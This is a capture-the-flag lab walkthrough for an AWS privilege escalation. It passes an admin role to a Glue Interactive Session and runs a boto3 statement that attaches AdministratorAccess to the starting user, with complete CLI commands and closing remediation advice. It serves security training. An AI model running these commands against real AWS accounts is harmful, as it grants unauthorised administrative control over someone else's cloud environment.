# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateSession + glue:RunStatement

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:CreateSession`, and `glue:RunStatement` permissions can create an AWS Glue Interactive Session with an administrative role and execute Python code that grants themselves administrative access.

AWS Glue Interactive Sessions provide a serverless, on-demand Spark or Python environment for data exploration and development. Unlike traditional Glue Jobs that execute predefined scripts, Interactive Sessions allow users to run arbitrary code statements in real-time through the `glue:RunStatement` API. When creating an Interactive Session, you specify an IAM role that the session assumes during execution. If an attacker can pass a privileged role to a session and then execute code within it, they can leverage the role's permissions to escalate their own privileges.

This attack is particularly dangerous because it provides immediate, interactive access to execute code with administrative permissions. The attacker doesn't need to wait for job completion or extract credentials -- they can directly call AWS APIs using boto3 (which is available by default in Glue sessions) to modify IAM permissions in real-time. The escalation path is straightforward: create a session with an admin role, run a Python statement that attaches AdministratorAccess to the starting user, and immediately gain full administrative access to the AWS environment.

## The Challenge

You start as `pl-prod-glue-007-to-admin-starting-user` -- an IAM user whose credentials were provided via Terraform outputs. At first glance, these permissions look like they belong to a data engineer: the ability to create and interact with Glue Interactive Sessions, plus `iam:PassRole` on a specific role. Your goal is to reach full administrator access.

The target is `pl-prod-glue-007-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. You cannot assume it directly -- there is no `sts:AssumeRole` permission in your policy. But you can pass it to something else.

## Reconnaissance

Start by confirming who you are and what region you are operating in:

```bash
aws sts get-caller-identity
```

Now check what policies are attached to your user to understand the full permission set:

```bash
aws iam list-user-policies --user-name pl-prod-glue-007-to-admin-starting-user
aws iam get-user-policy --user-name pl-prod-glue-007-to-admin-starting-user \
    --policy-name pl-prod-glue-007-to-admin-starting-user-policy
```

You will see three key permissions: `iam:PassRole` scoped to the admin role ARN, `glue:CreateSession`, and `glue:RunStatement`. You also have `glue:GetSession`, `glue:GetStatement`, and `glue:DeleteSession` as helpful recon and cleanup permissions. The combination is the vulnerability: you can create a compute environment that runs as the admin role and then feed it arbitrary Python.

## Exploitation

### Step 1: Create the Glue Interactive Session

Create a session and pass the admin role to it. Glue will assume that role during session initialization. Note the session ID -- you will need it for subsequent calls.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"  # adjust to your deployed region
SESSION_ID="pl-glue-007-attack-session"

aws glue create-session \
    --region "$REGION" \
    --id "$SESSION_ID" \
    --role "arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-007-to-admin-admin-role" \
    --command '{"Name":"glueetl","PythonVersion":"3"}' \
    --glue-version "4.0" \
    --worker-type "G.1X" \
    --number-of-workers 2
```

### Step 2: Wait for the Session to Reach READY State

Glue Interactive Sessions take 1-3 minutes to initialize. Poll the session status until it shows `READY`:

```bash
aws glue get-session --region "$REGION" --id "$SESSION_ID" \
    --query 'Session.Status' --output text
```

Keep polling every 10 seconds. Once the status is `READY`, the session is running as the admin role and ready to accept statements.

### Step 3: Run the Malicious Python Statement

Now the key step. Execute Python code inside the session that uses boto3 to attach `AdministratorAccess` to your starting user. Because the session is running as the admin role, this IAM call succeeds:

```bash
aws glue run-statement \
    --region "$REGION" \
    --session-id "$SESSION_ID" \
    --code "import boto3; iam = boto3.client('iam'); iam.attach_user_policy(UserName='pl-prod-glue-007-to-admin-starting-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')"
```

Note the returned `Id` field -- this is the statement ID you need to check execution status.

### Step 4: Confirm the Statement Completed

Poll the statement until its state is `AVAILABLE`:

```bash
STATEMENT_ID=0  # replace with the Id returned by run-statement

aws glue get-statement --region "$REGION" \
    --session-id "$SESSION_ID" \
    --id "$STATEMENT_ID" \
    --query 'Statement.State' --output text
```

Once it shows `AVAILABLE`, the Python code executed successfully inside the session.

## Verification

Wait about 15 seconds for IAM policy propagation, then verify you now have administrative access using your original starting user credentials:

```bash
aws iam list-users --max-items 3
```

If this succeeds, you have achieved administrator access. You can confirm the policy attachment directly:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-glue-007-to-admin-starting-user
```

You will see `AdministratorAccess` listed.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/glue-007-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a privilege escalation path that is easy to overlook during IAM reviews. The `iam:PassRole` permission is often granted broadly to let users assign roles to compute services. When combined with `glue:CreateSession` and `glue:RunStatement`, it becomes a full code execution primitive under the passed role's identity. There was no direct `sts:AssumeRole` involved -- Glue assumed the role on your behalf during session initialization, and your subsequent `RunStatement` call ran inside that privileged context.

This pattern appears in real environments where data teams are given flexible Glue permissions for ad-hoc analytics work. The fix is to ensure that any role passable to Glue carries only the minimum permissions needed for data operations -- never administrative policies. The PassRole permission itself should also be restricted with an `iam:PassedToService` condition so it cannot be reused against other compute services.
